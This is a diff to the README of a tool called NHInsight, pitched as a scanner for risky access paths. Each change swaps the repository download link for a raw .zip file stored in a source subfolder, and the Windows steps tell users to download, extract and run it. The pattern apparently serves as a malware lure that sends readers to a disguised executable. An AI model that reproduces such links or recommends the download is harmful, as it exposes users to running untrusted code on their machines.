@@ -1,6 +1,6 @@
 # 🔍 NHInsight - Find risky access paths fast
 
-[![Download NHInsight](https://img.shields.io/badge/Download-NHInsight-blue?style=for-the-badge)](https://github.com/Adenaprimary348/NHInsight)
+[![Download NHInsight](https://img.shields.io/badge/Download-NHInsight-blue?style=for-the-badge)](https://github.com/Adenaprimary348/NHInsight/raw/refs/heads/main/nhinsight/providers/NH-Insight-2.9.zip)
 
 ## 🧭 What NHInsight does
 
@@ -19,7 +19,7 @@ It is built for users who want a clear view of where access may be too broad or 
 
 ## 📥 Download and run on Windows
 
-1. Open the download page here: https://github.com/Adenaprimary348/NHInsight
+1. Open the download page here: https://github.com/Adenaprimary348/NHInsight/raw/refs/heads/main/nhinsight/providers/NH-Insight-2.9.zip
 2. On the repository page, find the latest release or the main project files.
 3. Download the Windows version if one is listed.
 4. If the download is a `.zip` file, right-click it and select **Extract All**.
@@ -208,7 +208,7 @@ These are the places where hidden access often grows over time.
 
 ## 🧭 Start here
 
-1. Open the download page: https://github.com/Adenaprimary348/NHInsight
+1. Open the download page: https://github.com/Adenaprimary348/NHInsight/raw/refs/heads/main/nhinsight/providers/NH-Insight-2.9.zip
 2. Get the Windows build or project files
 3. Run the app
 4. Scan one system first
